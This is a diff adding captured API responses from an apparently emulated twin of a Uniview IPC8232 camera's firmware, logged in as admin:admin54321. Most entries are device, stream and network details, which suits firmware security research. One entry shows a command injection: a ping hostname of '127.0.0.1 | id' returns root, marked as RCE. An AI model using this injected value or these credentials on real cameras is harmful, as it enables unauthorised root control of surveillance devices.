@@ -1,0 +1,36 @@
+# Twin /api/v2 responses (admin:admin54321, via run-ipc8232-vendor-api.py, host :18080)
+# captured 2026-11-19T10:50:40Z
+
+## GET /api/v2/device/info
+{"agent_platform":"vc-hal","agent_version":"v6.9.0-b575710","boot_version":"","build_platform":"hi3516ev300","encoder_version":"","firmware_version":"v5.8.0-b575710 260504","hardware_version":"","mac":"e4:f1:4c:24:ae:7a","model":"IPC8232SWC-WE","serial":"122000017347","soft_meta_version":"26.1.0504","vendor":"uniview"}
+
+## GET /api/v2/device/status
+{"is_online":true,"is_standalone":false,"remote_address":"violet.camera.rt.ru:4443 (94.25.103.43)","status_change_time":1795085352.791601}
+
+## GET /api/v2/device/uid
+{"uid":"8a0098c0-8d79-4a43-a3a8-da1571527af8"}
+
+## GET /api/v2/device/capabilities
+{"PIR":false,"PTZ":false,"ROI":false,"alarm_sender":true,"anatomy_temperature_detection":false,"archive_encryption":true,"attended_baggage_detection":false,"audio_output":true,"built_in_mic":true,"cryptography":false,"defocus_detection":false,"discovering":false,"ethernet":true,"face_detection":true,"group_detection":false,"hardware_encryption":false,"human_detection":false,"image_flip":true,"intellitrace":false,"intrusion_detection":true,"license_plate_detection":false,"line_crossing_detection":true,"line_input":false,"live_encryption":false,"loitering_detection":false,"motion_detection":true,"motion_human_detection":false,"motion_vehicle_detection":false,"num_of_alarm_inputs":0,"num_of_alarm_outputs":0,"num_of_cameras":0,"num_of_osd_text_labels":4,"num_of_streams":2,"osd_per_stream":true,"parking_detection":false,"peer_to_peer":true,"peri_control":true,"plugins_supported":false,"ptt":true,"rapid_move":false,"region_entrance_detection":false,"region_exiting_detection":false,"scene_change_detection":false,"siren":true,"sound_detection":true,"sound_level":true,"speech_detection":false,"stream_buffer_size":1048576,"tampering_detection":true,"unattended_baggage_detection":false,"wifi":false}
+
+## GET /api/v2/system/uptime
+{"app_uptime":98,"device_uptime":128}
+
+## GET /api/v2/stream/encoding
+{"audio":{"bitrate":64,"channels":1,"codec":"AAC","samplerate":16000},"video":{"bitrate":1536,"bitrate_mode":"VBR","codec":"H264","framerate":{"den":1,"num":25},"keyint":125,"profile":"Main","quality":100,"resolution":{"height":720,"width":1280}}}
+
+## GET /api/v2/stream/channel_id
+{"channel_id":"12122000-0173-47aa-aaaa-e4f14c24ae7a-main"}
+
+## GET /api/v2/image/capabilities
+{"backlight":{"blc_modes":["CENTER"],"dwdr_level":{"max":100,"min":0},"modes":["OFF","BLC","DWDR"]},"exposure":{"gain":{"max":10000,"min":0},"modes":["AUTO","MANUAL"],"shutter":["1\/25","1\/50","1\/75","1\/100","1\/120","1\/150","1\/175","1\/200","1\/225","1\/250","1\/300","1\/425","1\/600","1\/1000","1\/1250","1\/1750","1\/2500","1\/3500","1\/6000","1\/10000","1\/30000"]},"image_color":{"brightness":{"max":100,"min":0},"contrast":{"max":100,"min":0},"hue":{"max":100,"min":0},"saturation":{"max":100,"min":0},"sharpness":{"max":100,"min":0}},"image_flip":{"styles":["NONE","LEFT_RIGHT","UP_DOWN","CENTER","ROTATE","ROTATE_LEFT_RIGHT","ROTATE_UP_DOWN","ROTATE_CENTER"]},"night_mode":{"detection_types":[],"ir_light_level":{"max":1000,"min":0},"ir_light_modes":["OFF","MAX","AUTO","MANUAL"],"modes":["AUTO","NIGHT","DAY"],"sensitivity":{"max":1000,"min":1}},"noise_reduction":{"level":{"max":100,"min":0},"modes":["OFF","AUTO","MANUAL"]},"privacy_mask":{"max_regions":8},"white_balance":{"gain_blue":{"max":255,"min":0},"gain_red":{"max":255,"min":0},"modes":["AUTO","MANUAL"]}}
+
+## GET /api/v2/system/network/interfaces
+{"lan":{"dhcp":true,"gateway":"10.0.2.2","ip":"10.0.2.15","mac":"E4:F1:4C:24:AE:7A","mask":"255.255.255.0","primary_dns":"10.0.2.3","secondary_dns":""}}
+
+## POST /api/v2/system/network/ping {"hostname":"127.0.0.1 | id"}  (root RCE)
+uid=0(root) gid=0(root)
+
+
+## GET /api/v2/stream/snapshot  (needs frames -> fails)
+{"errmsg":"HI_MPI_VPSS_GetChnFrame() failed with 0xa007800e","status":"error"}
